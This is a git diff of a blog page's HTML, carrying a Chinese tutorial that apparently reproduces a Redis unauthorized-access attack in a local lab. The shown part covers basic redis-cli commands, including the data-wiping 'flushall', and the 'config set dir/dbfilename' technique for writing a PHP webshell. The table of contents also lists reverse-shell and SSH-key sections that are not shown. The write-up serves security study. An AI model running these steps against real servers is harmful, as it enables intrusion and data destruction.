@@ -1,11 +1,21 @@
+
+
 <!DOCTYPE html>
-<html lang=zh>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fco.jpg">
+  <link rel="icon" href="/img/fco.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mochazz">
+  <meta name="keywords" content="">
+  
     <meta name="description" content="一、简介和危害1. 什么是redis未授权访问漏洞Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redi">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Redis未授权访问初探">
@@ -37,156 +47,274 @@
 <meta property="article:modified_time" content="2023-04-20T15:02:33.631Z">
 <meta property="article:author" content="Mochazz">
 <meta property="article:tag" content="redis">
-<meta name="twitter:card" content="summary">
+<meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://suiyideali.github.io/img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis1.png">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>Redis未授权访问初探</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Redis未授权访问初探 - Mochazz&#39;blog</title>
 
-
-    <!-- Umami Analytics -->
-
-
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
-
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-<meta name="generator" content="Hexo 6.3.0"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">首页</a></li><!--
-     --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     --><!--
-       --><li><a href="/archives/">归档</a></li><!--
-     --><!--
-       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="上一篇" href="/2023/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="下一篇" href="/2023/04/20/%E5%BC%80%E7%AB%AF/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&text=Redis未授权访问初探"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&title=Redis未授权访问初探"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&is_video=false&description=Redis未授权访问初探"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Redis未授权访问初探&body=Check out this article: https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&title=Redis未授权访问初探"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&title=Redis未授权访问初探"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&title=Redis未授权访问初探"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&title=Redis未授权访问初探"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&name=Redis未授权访问初探&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://suiyideali.github.io/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/&t=Redis未授权访问初探"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B%E5%92%8C%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.</span> <span class="toc-text">一、简介和危害</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFredis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text">1. 什么是redis未授权访问漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.2.</span> <span class="toc-text">2 漏洞危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">二、漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.</span> <span class="toc-text">3. 基础命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.2.</span> <span class="toc-text">4. 未授权访问复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-%E5%88%A9%E7%94%A8redis%E5%86%99webshell"><span class="toc-number">2.2.1.</span> <span class="toc-text">4.1 利用redis写webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-%E5%88%A9%E7%94%A8%E2%80%9C%E5%85%AC%E7%A7%81%E9%92%A5%E2%80%9D%E8%AE%A4%E8%AF%81%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90"><span class="toc-number">2.2.2.</span> <span class="toc-text">4.2 利用“公私钥”认证获取root权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-%E5%88%A9%E7%94%A8Crontab%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.2.3.</span> <span class="toc-text">4.3 利用Crontab反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-%E9%80%9A%E8%BF%87%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-GetShell"><span class="toc-number">2.2.4.</span> <span class="toc-text">4.4 通过主从复制 GetShell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#4-4-1-redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">4.4.1 redis主从复制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-4-2-redis%E6%A8%A1%E5%9D%97"><span class="toc-number">2.2.4.2.</span> <span class="toc-text">4.4.2 redis模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-4-3-%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.4.3.</span> <span class="toc-text">4.4.3 利用原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-4-4-%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-number">2.2.4.4.</span> <span class="toc-text">4.4.4 复现过程</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">三、参考</span></a></li></ol>
-      </div>
-    
-  </span>
-</div>
-
-    
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle p-name" itemprop="name headline">
-        Redis未授权访问初探
-    </h1>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
 
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">Mochazz</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2023-04-20T13:40:01.000Z" class="dt-published" itemprop="datePublished">2023-04-20</time>
-        
-      
-    </div>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
 
 
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
-    </div>
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
 
 
-      
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/redis/" rel="tag">redis</a>
-    </div>
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
 
 
-    </div>
-  </header>
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
-  <div class="content e-content" itemprop="articleBody">
-    <h2 id="一、简介和危害"><a href="#一、简介和危害" class="headerlink" title="一、简介和危害"></a>一、简介和危害</h2><h3 id="1-什么是redis未授权访问漏洞"><a href="#1-什么是redis未授权访问漏洞" class="headerlink" title="1. 什么是redis未授权访问漏洞"></a>1. 什么是redis未授权访问漏洞</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"suiyideali.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Mochazz&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于我</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg/Background.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Redis未授权访问初探"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Mochazz
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-20 21:40" pubdate>
+          2023年4月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          52 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Redis未授权访问初探</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="一、简介和危害"><a href="#一、简介和危害" class="headerlink" title="一、简介和危害"></a>一、简介和危害</h2><h3 id="1-什么是redis未授权访问漏洞"><a href="#1-什么是redis未授权访问漏洞" class="headerlink" title="1. 什么是redis未授权访问漏洞"></a>1. 什么是redis未授权访问漏洞</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
 <p>漏洞产生的条件：</p>
 <ol>
 <li>redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；</li>
@@ -205,222 +333,482 @@
 </li>
 </ul>
 <p>使用命令启动redis服务</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis-conf</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-server /etc/redis-conf<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis1.png"></p>
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis1.png" srcset="/img/loading.gif" lazyload></p>
 <p>启动redis服务进程后，就可以使用测试攻击机程序redis-cli和靶机的redis服务交互了。 比如：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.0.110</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-cli -h 192.168.0.110<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis2.png"><br /> </p>
-<h3 id="3-基础命令"><a href="#3-基础命令" class="headerlink" title="3. 基础命令"></a>3. 基础命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#连接redis</span></span><br><span class="line"></span><br><span class="line">redis-cli -h ip -p 6379 -a passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看redis版本信息等</span></span><br><span class="line"></span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"><span class="comment">#列出当前数据库中所有的键</span></span><br><span class="line"></span><br><span class="line">keys *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除所有数据(谨慎使用)</span></span><br><span class="line"></span><br><span class="line">flushall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置主从关系</span></span><br><span class="line"></span><br><span class="line">slaveof ip port</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置一个键的值</span></span><br><span class="line"></span><br><span class="line">SET key value</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取一个建的值</span></span><br><span class="line"></span><br><span class="line">GET key </span><br></pre></td></tr></table></figure>
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis2.png" srcset="/img/loading.gif" lazyload><br /> </p>
+<h3 id="3-基础命令"><a href="#3-基础命令" class="headerlink" title="3. 基础命令"></a>3. 基础命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#连接redis</span><br><br>redis-cli -h ip -p 6379 -a passwd<br><br><span class="hljs-comment">#查看redis版本信息等</span><br><br>info<br><br><span class="hljs-comment">#列出当前数据库中所有的键</span><br><br>keys *<br><br><span class="hljs-comment"># 删除所有数据(谨慎使用)</span><br><br>flushall<br><br><span class="hljs-comment"># 设置主从关系</span><br><br>slaveof ip port<br><br><span class="hljs-comment">#设置一个键的值</span><br><br>SET key value<br><br><span class="hljs-comment">#获取一个建的值</span><br><br>GET key <br></code></pre></td></tr></table></figure>
 
-<h3 id="4-未授权访问复现"><a href="#4-未授权访问复现" class="headerlink" title="4. 未授权访问复现"></a>4. 未授权访问复现</h3><p>使用redis客户端直接无账号成功登录redis：<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis3.png"><br />从登录的结果可以看出该redis服务对公网开放，且未启用认证。</p>
+<h3 id="4-未授权访问复现"><a href="#4-未授权访问复现" class="headerlink" title="4. 未授权访问复现"></a>4. 未授权访问复现</h3><p>使用redis客户端直接无账号成功登录redis：<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis3.png" srcset="/img/loading.gif" lazyload><br />从登录的结果可以看出该redis服务对公网开放，且未启用认证。</p>
 <h4 id="4-1-利用redis写webshell"><a href="#4-1-利用redis写webshell" class="headerlink" title="4.1 利用redis写webshell"></a>4.1 利用redis写webshell</h4><p><strong>利用前提</strong>：</p>
 <ol>
 <li>靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</li>
 <li>开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a&#x2F;b的任意文件。）</li>
 </ol>
 <p>这里由于本地搭建，我们已经知道目录，我们把shell写入&#x2F;home&#x2F;ali目录下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /home/ali</span><br><span class="line">config <span class="built_in">set</span> dbfilename redis.php</span><br><span class="line"><span class="built_in">set</span> wenshell <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /home/ali<br>config <span class="hljs-built_in">set</span> dbfilename redis.php<br><span class="hljs-built_in">set</span> wenshell <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><br /> <img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis4.png"></p>
-<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis5.png"></p>
+<p><br /> <img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis5.png" srcset="/img/loading.gif" lazyload></p>
 <p>因为直接这样写会乱码。所以改良一下</p>
